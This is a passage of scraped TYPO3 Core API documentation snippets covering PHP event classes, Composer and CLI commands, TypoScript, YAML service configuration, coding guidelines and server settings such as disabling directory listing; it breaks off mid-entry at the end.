class with readonly attributes and methods for managing content security policies. Includes functionality for policy mutation, propagation control, and collection management.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/Security/PolicyMutatedEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Core\\Security\\ContentSecurityPolicy\\Event;\n\nclass PolicyMutatedEvent\n{\n    public readonly mixed $scope;\n    public readonly mixed $request;\n    public readonly mixed $defaultPolicy;\n\n    public function isPropagationStopped(): bool {}\n    public function stopPropagation(): void {}\n    public function getCurrentPolicy(): \\TYPO3\\CMS\\Core\\Security\\ContentSecurityPolicy\\Policy {}\n    public function setCurrentPolicy(\\TYPO3\\CMS\\Core\\Security\\ContentSecurityPolicy\\Policy $currentPolicy): void {}\n    public function getMutationCollections(): array {}\n    public function setMutationCollections(\\TYPO3\\CMS\\Core\\Security\\ContentSecurityPolicy\\MutationCollection ...$mutationCollections): void {}\n}\n```\n\n----------------------------------------\n\nTITLE: Defining AfterUserLoggedOutEvent Class in TYPO3 CMS Core Authentication\nDESCRIPTION: This snippet defines the AfterUserLoggedOutEvent class in the TYPO3\\CMS\\Core\\Authentication\\Event namespace. It includes a method getUser() that returns an instance of AbstractUserAuthentication.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Core/AfterUserLoggedOutEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Core\\Authentication\\Event;\n\nclass AfterUserLoggedOutEvent\n{\n    public function getUser(): \\TYPO3\\CMS\\Core\\Authentication\\AbstractUserAuthentication\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Data Access Methods\nDESCRIPTION: Methods for accessing element data, record information, and configuration details. These methods provide access to the underlying data structures and relationships.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyFileReferenceEnabledControlsEvent.rst.txt#2025-04-16_snippet_3\n\nLANGUAGE: PHP\nCODE:\n```\n..  php:method:: getElementData()\n    :returns: `array`\n\n..  php:method:: getRecord()\n    :returns: `array`\n\n..  php:method:: getParentUid()\n    :returns: `string`\n\n..  php:method:: getForeignTable()\n    :returns: `string`\n\n..  php:method:: getFieldConfiguration()\n    :returns: `array`\n\n..  php:method:: isVirtual()\n    :returns: `bool`\n```\n\n----------------------------------------\n\nTITLE: Installing TYPO3 Extension from Packagist\nDESCRIPTION: Example of installing a specific TYPO3 extension (Mask) from Packagist using Composer. This command specifies a tilde version constraint for more restrictive versioning.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/MigrateToComposer/MigrationSteps.rst#2025-04-16_snippet_4\n\nLANGUAGE: shell\nCODE:\n```\ncomposer require mask/mask:~8.3.0\n```\n\n----------------------------------------\n\nTITLE: Implementing a Custom Driver in TYPO3\nDESCRIPTION: Shows the implementation of a custom Doctrine DBAL driver class. This driver can be used with the CustomMiddleware example that implements UsableForConnectionInterface.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Database/Middleware/Index.rst#2025-04-16_snippet_7\n\nLANGUAGE: php\nCODE:\n```\n<?php\n\ndeclare(strict_types=1);\n\nnamespace Vendor\\Extension\\DoctrineDBAL;\n\nuse Doctrine\\DBAL\\Connection as DoctrineConnection;\nuse Doctrine\\DBAL\\Driver\\API\\ExceptionConverter;\nuse Doctrine\\DBAL\\Driver\\Connection as DriverConnection;\nuse Doctrine\\DBAL\\Driver\\PDO\\MySQL\\Driver as MySQLDriver;\nuse Doctrine\\DBAL\\Platforms\\AbstractPlatform;\n\nclass CustomDriver extends MySQLDriver\n{\n    public function connect(array $params): DriverConnection\n    {\n        return parent::connect($params);\n    }\n\n    public function getDatabasePlatform(): AbstractPlatform\n    {\n        return parent::getDatabasePlatform();\n    }\n\n    public function getExceptionConverter(): ExceptionConverter\n    {\n        return parent::getExceptionConverter();\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Handling HTML Content Safely in TYPO3 Fluid Templates\nDESCRIPTION: Example of outputting special characters and managing template content in TYPO3 using htmlspecialchars(), with specific attention to ViewHelper components within Fluid templates.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Security/GuidelinesExtensionDevelopment/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: html\nCODE:\n```\n{variable1}\n<f:format.crop append=\"{variable2}\">a very long text</f:format.crop>\n```\n\n----------------------------------------\n\nTITLE: Page TSconfig Configuration\nDESCRIPTION: Optional file containing Page TSconfig that is automatically loaded within the site scope.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/DirectoryStructure/SiteFolder.rst#2025-04-16_snippet_5\n\nLANGUAGE: typoscript\nCODE:\n```\npage.tsconfig\n```\n\n----------------------------------------\n\nTITLE: Implementing getRequest Method in ModifyUrlForCanonicalTagEvent Class\nDESCRIPTION: This method retrieves the current server request. It returns an object implementing the PSR-7 ServerRequestInterface.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Seo/ModifyUrlForCanonicalTagEvent.rst.txt#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n..  php:method:: getRequest()\n        :returns: `\\Psr\\Http\\Message\\ServerRequestInterface`\n```\n\n----------------------------------------\n\nTITLE: Complex Array Declaration with Nested Structures\nDESCRIPTION: Demonstrates proper array declaration with multiple elements, nested arrays, and consistent formatting guidelines\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/PhpSyntaxFormatting.rst#2025-04-16_snippet_21\n\nLANGUAGE: php\nCODE:\n```\n$thisIsAnArray = [\n    'foo' => 'bar',\n    'baz' => [\n        0 => 1\n    ]\n];\n```\n\n----------------------------------------\n\nTITLE: Setting TYPO3 Install Tool Password Configuration\nDESCRIPTION: PHP global configuration for setting the Install Tool password hash in the TYPO3 system settings.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Upgrade/Major/PostupgradeTasks/UpgradeWizard.rst.txt#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n$GLOBALS['TYPO3_CONF_VARS']['BE']['installToolPassword']\n```\n\n----------------------------------------\n\nTITLE: Configuring RSS Feed Settings in TYPO3 TypoScript\nDESCRIPTION: Sets up RSS feed configuration for a blog extension including channel settings and page rendering properties. Defines plugin settings and creates a specialized PAGE object for RSS output with specific HTTP headers and rendering configurations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/FrontendPlugins/TypoScriptPluginRss.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: typoscript\nCODE:\n```\nplugin.tx_blogexample {\n  settings {\n    rss {\n      channel {\n        typeNum = {$blogExampleRss.page_type}\n        title = {$blogExampleRss.title}\n      }\n    }\n  }\n}\n# RSS rendering\ntx_blogexample_rss = PAGE\ntx_blogexample_rss {\n  typeNum = {$blogExampleRss.page_type}\n  10 < tt_content.blogexample_postlistrss\n\n  config {\n    disableAllHeaderCode = 1\n    xhtml_cleaning = none\n    admPanel = 0\n    debug = 0\n    disablePrefixComment = 1\n    metaCharset = utf-8\n    additionalHeaders.10.header = Content-Type:application/rss+xml;charset=utf-8\n    linkVars >\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using AfterUserLoggedOutEvent Class Reference in TYPO3\nDESCRIPTION: Reference to the PHP class path for the AfterUserLoggedOutEvent PSR-14 event that handles post-logout processing in TYPO3 CMS.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Authentication/AfterUserLoggedOutEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Authentication\\Event\\AfterUserLoggedOutEvent\n```\n\n----------------------------------------\n\nTITLE: Disabling Canonical Tag Generation in TYPO3 PHP\nDESCRIPTION: This code snippet demonstrates how to disable the automatic generation of the canonical link tag in TYPO3. It unsets the corresponding global configuration option.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Seo/Configuration/Index.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\nunset($GLOBALS['TYPO3_CONF_VARS']['SC_OPTIONS']['TYPO3\\CMS\\Frontend\\Page\\PageGenerator']['generateMetaTags']['canonical']);\n```\n\n----------------------------------------\n\nTITLE: Using BeforeFolderAddedEvent in TYPO3\nDESCRIPTION: The PSR-14 event that fires before a folder is added to the TYPO3 resource storage system. It enables modification of folder properties before creation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Resource/BeforeFolderAddedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Resource\\Event\\BeforeFolderAddedEvent\n```\n\n----------------------------------------\n\nTITLE: Running TYPO3 Console Commands\nDESCRIPTION: Command-line examples for running TYPO3 console commands in both Composer-based and legacy installations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CommandControllers/Tutorial.rst#2025-04-16_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nvendor/bin/typo3 examples:dosomething\n```\n\nLANGUAGE: bash\nCODE:\n```\ntypo3/sysext/core/bin/typo3 examples:dosomething\n```\n\nLANGUAGE: bash\nCODE:\n```\nvendor/bin/typo3 cache:flush\n```\n\n----------------------------------------\n\nTITLE: Using AfterFolderDeletedEvent in TYPO3\nDESCRIPTION: Event class signature for handling post-folder deletion operations in TYPO3. The event provides access to the deleted folder object and allows for additional cleanup tasks.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Core/Resource/AfterFolderDeletedEvent.rst#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\n\\TYPO3\\CMS\\Core\\Resource\\Event\\AfterFolderDeletedEvent\n```\n\n----------------------------------------\n\nTITLE: Defining ReStructuredText Table of Contents for TYPO3 Routing Documentation\nDESCRIPTION: This snippet defines a table of contents using ReStructuredText syntax for TYPO3 routing documentation. It includes sections on introduction, page-based routing, advanced configuration, extending routing, and examples.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Routing/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: restructuredtext\nCODE:\n```\n.. toctree::\n   :titlesonly:\n   :maxdepth: 1\n\n   Introduction\n   PageBasedRouting\n   AdvancedRoutingConfiguration\n   ExtendingRouting\n   Examples\n```\n\n----------------------------------------\n\nTITLE: Registering Cache Tags in Extbase Controller with CacheDataCollector\nDESCRIPTION: Example of how to add cache tags to the current page rendering using the CacheDataCollector in an Extbase controller. This ensures the page cache is automatically cleared when specific records are updated in the backend.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/DataHandler/Database/Index.rst#2025-04-16_snippet_10\n\nLANGUAGE: php\nCODE:\n```\n<?php\ndeclare(strict_types=1);\n\nnamespace MyVendor\\MyExtension\\Controller;\n\nuse TYPO3\\CMS\\Core\\Cache\\CacheDataCollector;\n\nclass SomeController extends \\TYPO3\\CMS\\Extbase\\Mvc\\Controller\\ActionController\n{\n    public function detailAction(\\MyVendor\\MyExtension\\Domain\\Model\\Entity $entity): \\Psr\\Http\\Message\\ResponseInterface\n    {\n        // Get CacheDataCollector from request attribute\n        $cacheDataCollector = $this->request->getAttribute('frontend.cache.collector');\n        if ($cacheDataCollector instanceof CacheDataCollector) {\n            // Register a tag for the specific record\n            $cacheDataCollector->addCacheTags(['tx_myextension_entity_' . $entity->getUid()]);\n        }\n        \n        $this->view->assign('entity', $entity);\n        return $this->htmlResponse();\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Registering Backend Controller in Services.yaml Configuration\nDESCRIPTION: YAML configuration for registering a backend controller in the services.yaml file. This is necessary when the controller is not tagged with the AsController attribute to ensure dependency injection works properly.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/HowTo/BackendModule/CreateModule.rst#2025-04-16_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nservices:\n  _defaults:\n    autowire: true\n    autoconfigure: true\n    public: false\n\n  T3docs\\Examples\\:\n    resource: '../Classes/*'\n    exclude: '../Classes/Domain/Model/*'\n\n  T3docs\\Examples\\Controller\\AdminModuleController:\n    tags: ['backend.controller']\n```\n\n----------------------------------------\n\nTITLE: Retrieving Validator Options in TYPO3 PHP\nDESCRIPTION: Method to retrieve the currently configured options for the validator. Returns an array of all options previously set via setOptions().\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Api/ValidatorInterface.rst.txt#2025-04-16_snippet_2\n\nLANGUAGE: php\nCODE:\n```\ngetOptions()\n```\n\n----------------------------------------\n\nTITLE: Configuring AllowOverride in Apache Virtual Host for TYPO3\nDESCRIPTION: This configuration snippet demonstrates how to set the AllowOverride directive in an Apache Virtual Host record for TYPO3. It specifies that 'Indexes' and 'FileInfo' should be included to allow .htaccess files to override directory indexes and file-related directives.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Installation/SystemRequirements/Apache.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: apache\nCODE:\n```\nAllowOverride Indexes FileInfo\n```\n\n----------------------------------------\n\nTITLE: Accessing Request Attributes\nDESCRIPTION: Shows how to retrieve all attributes or specific attributes from the request object.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/RequestLifeCycle/Typo3Request.rst#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\n// Get all available attributes\n$allAttributes = $request->getAttributes();\n\n// Get only a specific attribute, here the site entity in frontend context\n$site = $request->getAttribute('site');\n```\n\n----------------------------------------\n\nTITLE: Simple URL Navigation on Select Change\nDESCRIPTION: HTML select element that triggers navigation to a URL when its value changes. Uses data-global-event and data-action-navigate attributes.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/Navigation/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<select data-global-event=\"change\" data-action-navigate=\"$value\">\n    <!-- ... options ... -->\n</select>\n```\n\n----------------------------------------\n\nTITLE: Defining ExtbasePluginListTypeToCTypeUpdate Class in PHP for TYPO3 CMS\nDESCRIPTION: This code snippet defines the ExtbasePluginListTypeToCTypeUpdate class, which extends AbstractListTypeToCTypeUpdate. It is a final class, meaning it cannot be extended further. This class is likely used in TYPO3 CMS for upgrading Extbase plugin list types to CTypes.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Extbase/Upgrades/ExtbasePluginListTypeToCTypeUpdate.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\nfinal class ExtbasePluginListTypeToCTypeUpdate extends AbstractListTypeToCTypeUpdate\n{\n\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a DropDown Button in TYPO3 Backend\nDESCRIPTION: This code shows how to implement a dropdown button in a TYPO3 backend module. It creates a dropdown button with a label, title, icon, and adds a single dropdown item with its own label and href attribute.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/ButtonComponents.rst#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\n$dropDownButton = $buttonBar->makeDropDownButton()\n    ->setLabel('Dropdown')\n    ->setTitle('Save')\n    ->setIcon($this->iconFactory->getIcon('actions-heart'))\n    ->addItem(\n        GeneralUtility::makeInstance(DropDownItem::class)\n            ->setLabel('Item')\n            ->setHref('#')\n    );\n```\n\n----------------------------------------\n\nTITLE: RST Image Directive for Database Analyzer Screenshot\nDESCRIPTION: ReStructuredText directive for including a screenshot of the TYPO3 Database Analyzer tool with shadow styling.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Images/AutomaticScreenshots/AdminTools/DatabaseAnalyzer.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n.. figure:: /Images/AutomaticScreenshots/AdminTools/DatabaseAnalyzer.png\n   :class: with-shadow\n\n   Analyze the database structure\n```\n\n----------------------------------------\n\nTITLE: Running TYPO3 Setup Process\nDESCRIPTION: Commands to initialize TYPO3 setup either through CLI or GUI installer. Includes options for different environments.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Installation/Install.rst#2025-04-16_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\n./vendor/bin/typo3 setup\n```\n\nLANGUAGE: powershell\nCODE:\n```\n./vendor/bin/typo3 setup\n```\n\nLANGUAGE: bash\nCODE:\n```\nddev exec ./vendor/bin/typo3 setup\n```\n\n----------------------------------------\n\nTITLE: Configuring Cross-Site Mount Point in TYPO3\nDESCRIPTION: This snippet shows the configuration for a cross-site mount point in TYPO3. It includes the title, URL segment, target page, and display option for the mount point.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/MountPoints/Index.rst#2025-04-16_snippet_3\n\nLANGUAGE: none\nCODE:\n```\nTitle         :  Cross site mount\nURL segment   :  cross-site-mount\nTarget page   :  Company\nDisplay option:  \"Show the mounted page\" (subpages included)\n```\n\n----------------------------------------\n\nTITLE: Incorrect Conditional Structure Example in PHP\nDESCRIPTION: Illustrates an incorrect structural layout for conditions using an 'else if' construct, which is not preferred in TYPO3 PHP coding standards.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodingGuidelines/CglPhp/PhpSyntaxFormatting.rst#2025-04-16_snippet_13\n\nLANGUAGE: php\nCODE:\n```\nif ($this->processSubmission) {\n    // Process submission here\n}\nelseif ($this->internalError) {\n    // Handle internal error\n} else {\n    // Something else here\n}\n```\n\n----------------------------------------\n\nTITLE: Defining RST Document Structure for Rich Text Editors in TYPO3\nDESCRIPTION: This RST code snippet defines the document structure for the Rich Text Editors chapter in TYPO3 documentation. It includes navigation title, index entries, and a table of contents for related subtopics.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Rte/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: rst\nCODE:\n```\n:navigation-title: RTE\n.. include:: /Includes.rst.txt\n.. index::\n   Rich text editor\n   RTE\n   see: RTE; Rich text editor\n   CKEditor\n.. _rte:\n\n=======================\nRich text editors (RTE)\n=======================\n\nThis chapter contains general information about Rich Text Editors (RTE)\nin TYPO3, how they are integrated\nin the TYPO3 Backend and what transformations get applied along the\nvarious processes (saving to the database, rendering to the frontend, etc.)\n\n..  toctree::\n    :titlesonly:\n    :hidden:\n\n    RenderingInTheFrontend/Index\n    InTheBackend/Index\n    InTheFrontend/Index\n    Transformations/Index\n    HistoricalRteTransformations/Index\n```\n\n----------------------------------------\n\nTITLE: Installing TYPO3 Dependencies without Development Packages\nDESCRIPTION: This command installs TYPO3 dependencies using Composer, excluding development packages for a production environment.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/Installation/Deployment/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\ncomposer install --no-dev\n```\n\n----------------------------------------\n\nTITLE: TYPO3 Language Update Command Usage (Bash)\nDESCRIPTION: This snippet shows the bash command syntax for the TYPO3 language:update command that works with ModifyLanguagePacksEvent. The command can be used to further restrict downloads beyond what the event defines.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Events/Events/Install/ModifyLanguagePacksEvent.rst#2025-04-16_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nlanguage:update\n```\n\n----------------------------------------\n\nTITLE: Using runTests.sh Script Examples\nDESCRIPTION: Example commands showing common test operations using the runTests.sh script from the blog_example project. Commands cover code style, composer installation, linting, code analysis, unit tests, functional tests, and documentation rendering.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/TestRunners.rst#2025-04-16_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\nrunTests.sh -s cgl\nrunTests.sh -s composer ...\nrunTests.sh -s lint\nrunTests.sh -s phpstan\nrunTests.sh -s unit\nrunTests.sh -s functional\nrunTests.sh -s renderDocumentation\n```\n\n----------------------------------------\n\nTITLE: ModifyBlindedConfigurationOptionsEvent Class Definition\nDESCRIPTION: PHP class that provides methods to modify and retrieve blinded configuration options in TYPO3's configuration module. The class resides in the TYPO3\\CMS\\Lowlevel\\Event namespace.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Lowlevel/ModifyBlindedConfigurationOptionsEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: php\nCODE:\n```\nnamespace TYPO3\\CMS\\Lowlevel\\Event;\n\nclass ModifyBlindedConfigurationOptionsEvent\n{\n    public function setBlindedConfigurationOptions(array $blindedConfigurationOptions)\n    {\n        // Allows to define configuration options to be blinded\n    }\n\n    public function getBlindedConfigurationOptions(): array\n    {\n        // Returns the blinded configuration options\n    }\n\n    public function getProviderIdentifier(): string\n    {\n        // Returns the configuration provider identifier\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Disabling Directory Listing in IIS\nDESCRIPTION: This command line snippet illustrates how to disable directory listing in IIS using the appcmd command, applicable from IIS7 and above.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Security/GuidelinesAdministrators/DirectoryIndexing.rst#2025-04-16_snippet_3\n\nLANGUAGE: shell\nCODE:\n```\nappcmd set config /section:directoryBrowse /enabled:false\n```\n\n----------------------------------------\n\nTITLE: Defining ModifyValidatorTaskEmailEvent Class in PHP for TYPO3 Linkvalidator\nDESCRIPTION: This snippet defines the ModifyValidatorTaskEmailEvent class within the TYPO3\\CMS\\Linkvalidator\\Event namespace. It includes three methods for retrieving different components related to link validation and email generation.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Linkvalidator/ModifyValidatorTaskEmailEvent.rst.txt#2025-04-16_snippet_0\n\nLANGUAGE: PHP\nCODE:\n```\n<?php\nnamespace TYPO3\\CMS\\Linkvalidator\\Event;\n\nclass ModifyValidatorTaskEmailEvent\n{\n    public function getLinkAnalyzerResult(): \\TYPO3\\CMS\\Linkvalidator\\Result\\LinkAnalyzerResult\n    {\n        // Implementation not shown\n    }\n\n    public function getFluidEmail(): \\TYPO3\\CMS\\Core\\Mail\\FluidEmail\n    {\n        // Implementation not shown\n    }\n\n    public function getModTSconfig(): array\n    {\n        // Implementation not shown\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring TYPO3 Extension in ext_emconf.php\nDESCRIPTION: Legacy configuration format for TYPO3 extensions using ext_emconf.php file. Contains extension metadata and dependencies for non-Composer installations.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ExtensionArchitecture/Tutorials/Tea/ExtensionConfiguration.rst#2025-04-16_snippet_1\n\nLANGUAGE: txt\nCODE:\n```\n<?php\\n$EM_CONF[$_EXTKEY] = [\\n    'title' => 'Tea',\\n    'description' => 'TYPO3 extension to catalog teas',\\n    'category' => 'plugin',\\n    'state' => 'stable',\\n    'clearCacheOnLoad' => 0,\\n    'version' => '3.0.0',\\n    'constraints' => [\\n        'depends' => [\\n            'typo3' => '11.5.0-12.4.99',\\n        ],\\n        'conflicts' => [],\\n        'suggests' => [],\\n    ],\\n];\n```\n\n----------------------------------------\n\nTITLE: Initial Enetcache Extension composer.json Configuration\nDESCRIPTION: Original composer.json file for the Enetcache extension, defining basic metadata, dependencies, and autoloading\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Testing/Tutorial/Enetcache.rst#2025-04-16_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"name\": \"lolli/enetcache\",\n  \"type\": \"typo3-cms-extension\",\n  \"description\": \"Enetcache cache extension\",\n  \"homepage\": \"https://github.com/lolli42/enetcache\",\n  \"authors\": [\n    {\n      \"name\": \"Christian Kuhn\",\n      \"role\": \"Developer\"\n    }\n  ],\n  \"license\": [\n    \"GPL-2.0-or-later\"\n  ],\n  \"require\": {\n    \"typo3/cms-core\": \"^13\"\n  },\n  \"autoload\": {\n    \"psr-4\": {\n      \"Lolli\\\\Enetcache\\\\\": \"Classes\"\n    }\n  },\n  \"extra\": {\n    \"branch-alias\": {\n      \"dev-master\": \"2.x-dev\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Menu Module Retrieval Method\nDESCRIPTION: Method to get a specific module prepared for menu generation, considering TSConfig and access permissions.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Manual/Backend/ModuleProvider.rst.txt#2025-04-16_snippet_3\n\nLANGUAGE: php\nCODE:\n```\nphp:method:: getModuleForMenu(string $identifier, \\TYPO3\\CMS\\Core\\Authentication\\BackendUserAuthentication $user, bool $respectWorkspaceRestrictions = true)\n:returns: `?\\TYPO3\\CMS\\Backend\\Module\\MenuModule`\n```\n\n----------------------------------------\n\nTITLE: AfterImageResourceResolvedEvent Class Definition\nDESCRIPTION: Class definition for handling image resource resolution events in TYPO3, including methods for getting and setting image resources and file references.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Frontend/AfterImageResourceResolvedEvent.rst.txt#2025-04-16_snippet_1\n\nLANGUAGE: php\nCODE:\n```\nclass AfterImageResourceResolvedEvent {\n    public function getFile(): \\TYPO3\\CMS\\Core\\Resource\\File|\\TYPO3\\CMS\\Core\\Resource\\FileReference|string;\n    public function getFileArray(): array;\n    public function getImageResource(): ?\\TYPO3\\CMS\\Core\\Imaging\\ImageResource;\n    public function setImageResource(?\\TYPO3\\CMS\\Core\\Imaging\\ImageResource $imageResource);\n}\n```\n\n----------------------------------------\n\nTITLE: Variable Assignment with lit-html\nDESCRIPTION: Demonstrates basic variable interpolation using lit-html render function to display dynamic content.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Backend/JavaScript/Templating/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\nimport {html, render} from 'lit-html';\n\nconst value = 'World';\nconst target = document.getElementById('target');\nrender(html`<div>Hello ${value}!</div>`, target);\n```\n\nLANGUAGE: html\nCODE:\n```\n<div>Hello World!</div>\n```\n\n----------------------------------------\n\nTITLE: Implementing getRecord Method in PHP\nDESCRIPTION: This method retrieves the current record from the RecordList.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/CodeSnippets/Events/Backend/ModifyRecordListRecordActionsEvent.rst.txt#2025-04-16_snippet_9\n\nLANGUAGE: PHP\nCODE:\n```\npublic function getRecord(): array\n{\n    // Method implementation\n}\n```\n\n----------------------------------------\n\nTITLE: Rendering RTE Content Using Fluid ViewHelper\nDESCRIPTION: Shows how to render RTE field content using the Format.html ViewHelper in a Fluid template. This method handles HTML and pseudo HTML content from RTE fields.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/Rte/RenderingInTheFrontend/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: html\nCODE:\n```\n<f:format.html>{data.bodytext}</f:format.html>\n```\n\n----------------------------------------\n\nTITLE: Single Site Backend Groups Structure Diagram\nDESCRIPTION: PlantUML diagram showing the basic structure of backend user groups for a single-site TYPO3 project, including system groups and ACL groups.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/Administration/PermissionsManagement/ExampleConfiguration/Index.rst#2025-04-16_snippet_0\n\nLANGUAGE: plantuml\nCODE:\n```\n..  uml:: _backend-groups-simple-project.plantuml\n```\n\n----------------------------------------\n\nTITLE: Running TYPO3 Command Line Interface in Composer Installation\nDESCRIPTION: The command for running TYPO3 CLI tools in a standard Composer-based installation. This is used as the base script for executing console commands.\nSOURCE: https://github.com/TYPO3-Documentation/TYPO3CMS-Reference-CoreApi/blob/main/Documentation/ApiOverview/CommandControllers/ListCommands.rst#2025-04-16_snippet_0\n\nLANGUAGE: 